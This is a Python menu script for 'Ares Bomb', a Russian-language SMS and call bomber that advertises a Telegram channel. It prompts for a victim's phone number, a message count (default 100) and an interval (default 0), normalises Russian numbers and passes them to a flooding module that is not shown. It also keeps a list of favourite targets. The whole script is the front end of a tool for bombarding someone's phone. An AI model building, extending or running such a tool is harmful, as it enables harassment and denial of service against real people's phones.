import favphones, settings, generate
import os
try:
	import core
except:
	if os.path.isfile("sms.py") != 1:
		generate.generate("-s", (input("Введите имя файла базы данных для смс: ") + ".arsdat"))
	if os.path.isfile("calls.py") != 1:
		generate.generate("-c", (input("Введите имя файла базы данных для звонков: ") + ".arsdat"))
	exit()

banner = ("\n" * 100)+ """
     _                        
    / \   _ __ ___  ___       
   / _ \ | '__/ _ \/ __|      
  / ___ \| | |  __/\__ \      
 /_/   \_\_|  \___||___/      
  ____                  _     
 | __ )  ___  _ __ ___ | |__  
 |  _ \ / _ \| '_ ` _ \| '_ \ 
 | |_) | (_) | | | | | | |_) |
 |____/ \___/|_| |_| |_|_.__/ 

 telegram channel: @AresBomb                         
"""
if os.path.isfile("config.data") == 1:
	set = []
	with open('config.data', 'r') as filehandle:
	 	for line in filehandle:
	 		currentPlace = line[:-1]
	 		set.append(float(currentPlace))

def bomb():
	print(banner)
	_phone = input('Введите номер для бомбинга (79xxxxxxxxx)\n1 - Выбрать номер из избранного\n')
	if _phone == "1": favphones.return_phones()
	try:
		_count = int(input('Количество сообщений: (100 по умолчанию)'))
	except:
		_count = 100
		
	try:
		_timer = float(input('Интервал между сообщениями: (0 по умолчанию) '))
	except:
		_timer = 0.00
		
	if _phone[0] == '+': _phone = _phone[1:]
	if _phone[0] == '8': _phone = '7'+_phone[1:]
	if _phone[0] == '9': _phone = '7'+_phone
	
	core.main("-g", _phone, _count, _timer, set[1])

while True:
	print(banner)
	menu = input("1 - Начать бомбинг\n2 - Настройки бомбера\n3 - Номера в избранном\n4 - Информация о бомбере\n\n0 - Выход\n")
	if menu == "0": exit()
	if menu == "1": bomb()
	if menu == "2": settings.settings()
	if menu == "3": favphones.save_phones()
